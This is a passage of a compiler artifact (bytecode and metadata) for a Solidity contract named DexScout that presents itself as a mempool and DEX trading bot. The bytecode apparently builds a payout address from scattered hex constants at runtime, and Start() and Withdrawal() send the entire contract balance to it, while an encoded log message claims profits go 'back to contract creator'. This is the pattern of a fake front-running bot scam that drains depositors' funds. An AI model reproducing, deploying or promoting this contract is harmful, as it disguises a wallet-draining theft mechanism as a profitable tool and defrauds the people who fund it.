JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH3 0x14B JUMPI PUSH3 0x14A PUSH3 0xDB JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH3 0x15E DUP3 PUSH3 0x73 JUMP JUMPDEST SWAP2 POP PUSH3 0x16B DUP4 PUSH3 0x73 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH3 0x186 JUMPI PUSH3 0x185 PUSH3 0xDB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xD97 DUP1 PUSH3 0x19A PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x42 JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x4C JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x56 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x4A PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x54 PUSH2 0xAD JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5E PUSH2 0x12F JUMP JUMPDEST STOP JUMPDEST PUSH2 0x68 PUSH2 0x166 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xAA JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0xDA SWAP1 PUSH2 0x9AF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0xEA PUSH2 0x17C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x12C JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x15C SWAP1 PUSH2 0xA17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH0 PUSH2 0x177 PUSH2 0x172 PUSH2 0x192 JUMP JUMPDEST PUSH2 0x2D2 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH2 0x18D PUSH2 0x188 PUSH2 0x192 JUMP JUMPDEST PUSH2 0x2D2 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x19D PUSH2 0x59D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0x70083F SWAP1 POP PUSH0 PUSH4 0xE5B41D93 SWAP1 POP PUSH0 PUSH2 0x1B7 PUSH2 0x5A7 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x1C2 PUSH2 0x5B1 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x213 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x20E PUSH2 0x209 PUSH2 0x5BC JUMP JUMPDEST PUSH2 0x5C7 JUMP JUMPDEST PUSH2 0x6E8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x228 DUP3 PUSH2 0x223 DUP10 PUSH2 0x5C7 JUMP JUMPDEST PUSH2 0x6E8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x245 PUSH2 0x237 DUP9 PUSH2 0x5C7 JUMP JUMPDEST PUSH2 0x240 DUP9 PUSH2 0x5C7 JUMP JUMPDEST PUSH2 0x6E8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x251 DUP7 PUSH2 0x5C7 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x25D DUP7 PUSH2 0x5C7 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x27C PUSH2 0x26D DUP7 DUP7 PUSH2 0x6E8 JUMP JUMPDEST PUSH2 0x277 DUP6 DUP6 PUSH2 0x6E8 JUMP JUMPDEST PUSH2 0x6E8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2BE PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x6E8 JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 DUP3 SWAP1 POP PUSH0 DUP1 DUP1 PUSH0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x590 JUMPI PUSH2 0x100 DUP5 PUSH2 0x2F7 SWAP2 SWAP1 PUSH2 0xA81 JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x30C JUMPI PUSH2 0x30B PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x32D SWAP2 SWAP1 PUSH2 0xAF8 JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x33E JUMPI PUSH2 0x33D PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x38F JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x3A8 JUMPI PUSH1 0x57 DUP4 PUSH2 0x3A1 SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP3 POP PUSH2 0x454 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x3E6 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x3FF JUMPI PUSH1 0x37 DUP4 PUSH2 0x3F8 SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP3 POP PUSH2 0x453 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x43D JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x452 JUMPI PUSH1 0x30 DUP4 PUSH2 0x44F SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x492 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4AB JUMPI PUSH1 0x57 DUP3 PUSH2 0x4A4 SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP2 POP PUSH2 0x557 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4E9 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x502 JUMPI PUSH1 0x37 DUP3 PUSH2 0x4FB SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP2 POP PUSH2 0x556 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x540 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x555 JUMPI PUSH1 0x30 DUP3 PUSH2 0x552 SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0x565 SWAP2 SWAP1 PUSH2 0xA81 JUMP JUMPDEST PUSH2 0x56F SWAP2 SWAP1 PUSH2 0xB72 JUMP JUMPDEST DUP5 PUSH2 0x57A SWAP2 SWAP1 PUSH2 0xB72 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0x589 SWAP2 SWAP1 PUSH2 0xAF8 JUMP JUMPDEST SWAP1 POP PUSH2 0x2E0 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH3 0x3E1C9A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xF7DE0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xAF95910D SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xD19B575 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH0 DUP2 EQ PUSH2 0x5F8 JUMPI DUP2 DUP1 PUSH2 0x5E1 SWAP1 PUSH2 0xBB9 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0x5F1 SWAP2 SWAP1 PUSH2 0xC2D JUMP JUMPDEST SWAP1 POP PUSH2 0x5CF JUMP JUMPDEST PUSH0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x613 JUMPI PUSH2 0x612 PUSH2 0xC5D JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x645 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x6DC JUMPI PUSH1 0x10 DUP7 PUSH2 0x65F SWAP2 SWAP1 PUSH2 0xC8A JUMP JUMPDEST SWAP3 POP PUSH2 0x66A DUP4 PUSH2 0x86E JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0x679 SWAP2 SWAP1 PUSH2 0xCBA JUMP JUMPDEST PUSH2 0x683 SWAP2 SWAP1 PUSH2 0xCBA JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x694 JUMPI PUSH2 0x693 PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0x6CF SWAP2 SWAP1 PUSH2 0xC2D JUMP JUMPDEST SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x64A JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP4 SWAP1 POP PUSH0 DUP4 SWAP1 POP PUSH0 DUP2 MLOAD DUP4 MLOAD PUSH2 0x701 SWAP2 SWAP1 PUSH2 0xAF8 JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x71A JUMPI PUSH2 0x719 PUSH2 0xC5D JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x74C JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP2 SWAP1 POP PUSH0 DUP1 PUSH0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x7DA JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x775 JUMPI PUSH2 0x774 PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x78C SWAP1 PUSH2 0xBB9 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x79F JUMPI PUSH2 0x79E PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x759 JUMP JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0x85F JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x7FA JUMPI PUSH2 0x7F9 PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x811 SWAP1 PUSH2 0xBB9 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x824 JUMPI PUSH2 0x823 PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x7DE JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xFF AND PUSH0 GT ISZERO DUP1 ISZERO PUSH2 0x886 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x8C4 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x8BA SWAP2 SWAP1 PUSH2 0xCF9 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x92A JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0x8DC JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x926 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x912 SWAP2 SWAP1 PUSH2 0xCF9 JUMP JUMPDEST PUSH2 0x91C SWAP2 SWAP1 PUSH2 0xD2D JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x92A JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x53656E64696E672070726F66697473206261636B20746F20636F6E7472616374 PUSH0 DUP3 ADD MSTORE PUSH32 0x2063726561746F7220616464726573732E2E2E00000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x999 PUSH1 0x33 DUP4 PUSH2 0x92F JUMP JUMPDEST SWAP2 POP PUSH2 0x9A4 DUP3 PUSH2 0x93F JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x9C6 DUP2 PUSH2 0x98D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53746F7070696E6720636F6E747261637420626F742E2E2E0000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xA01 PUSH1 0x18 DUP4 PUSH2 0x92F JUMP JUMPDEST SWAP2 POP PUSH2 0xA0C DUP3 PUSH2 0x9CD JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA2E DUP2 PUSH2 0x9F5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xA8B DUP3 PUSH2 0xA35 JUMP JUMPDEST SWAP2 POP PUSH2 0xA96 DUP4 PUSH2 0xA35 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0xAA4 DUP2 PUSH2 0xA35 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0xABB JUMPI PUSH2 0xABA PUSH2 0xA54 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xB02 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xB0D DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0xB25 JUMPI PUSH2 0xB24 PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xB35 DUP3 PUSH2 0xA35 JUMP JUMPDEST SWAP2 POP PUSH2 0xB40 DUP4 PUSH2 0xA35 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xB6C JUMPI PUSH2 0xB6B PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xB7C DUP3 PUSH2 0xA35 JUMP JUMPDEST SWAP2 POP PUSH2 0xB87 DUP4 PUSH2 0xA35 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xBB3 JUMPI PUSH2 0xBB2 PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xBC3 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0xBF5 JUMPI PUSH2 0xBF4 PUSH2 0xA54 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xC37 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xC42 DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xC52 JUMPI PUSH2 0xC51 PUSH2 0xC00 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xC94 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xC9F DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xCAF JUMPI PUSH2 0xCAE PUSH2 0xC00 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xCC4 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xCCF DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0xCE7 JUMPI PUSH2 0xCE6 PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xD03 DUP3 PUSH2 0xCED JUMP JUMPDEST SWAP2 POP PUSH2 0xD0E DUP4 PUSH2 0xCED JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xD27 JUMPI PUSH2 0xD26 PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD37 DUP3 PUSH2 0xCED JUMP JUMPDEST SWAP2 POP PUSH2 0xD42 DUP4 PUSH2 0xCED JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xD5B JUMPI PUSH2 0xD5A PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE6 0xC2 0xF6 0xE2 0xEF DUP1 GASPRICE 0x25 0xC5 SWAP7 PUSH12 0x3D7F968FC022768BEE9C9084 JUMPDEST PUSH28 0xC17EE3E15FBB4C64736F6C6343000818003300000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "695800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"Start()": "infinite",
						"Stop()": "1938",
						"Withdrawal()": "infinite"
					},
					"internal": {
						"WithdrawalProfits()": "infinite",
						"_calculateGasNeeds()": "22",
						"_callDexAction()": "infinite",
						"beyond(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"calcLiquidityInContract(struct DexScout.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"findNewContracts(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"getMemPoolDepth()": "22",
						"getMemPoolHeight()": "22",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "22",
						"keccak(struct DexScout.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"orderContractsByLiquidity(struct DexScout.slice memory)": "infinite",
						"parseMempool(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"Start()": "1b55ba3a",
					"Stop()": "bedf0f4a",
					"Withdrawal()": "70e44c6a"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 8,
						"contract": "dexscout.sol:DexScout",
						"label": "_Deposit",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 10,
						"contract": "dexscout.sol:DexScout",
						"label": "_Network",
						"offset": 0,
						"slot": "1",
						"type": "t_uint256"
					},
					{
						"astId": 12,
						"contract": "dexscout.sol:DexScout",
						"label": "liquidity",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					},
					{
						"astId": 14,
						"contract": "dexscout.sol:DexScout",
						"label": "startTime",
						"offset": 0,
						"slot": "3",
						"type": "t_uint256"
					},
					{
						"astId": 16,
						"contract": "dexscout.sol:DexScout",
						"label": "endTime",
						"offset": 0,
						"slot": "4",
						"type": "t_uint256"
					},
					{
						"astId": 18,
						"contract": "dexscout.sol:DexScout",
						"label": "Runtime",
						"offset": 0,
						"slot": "5",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}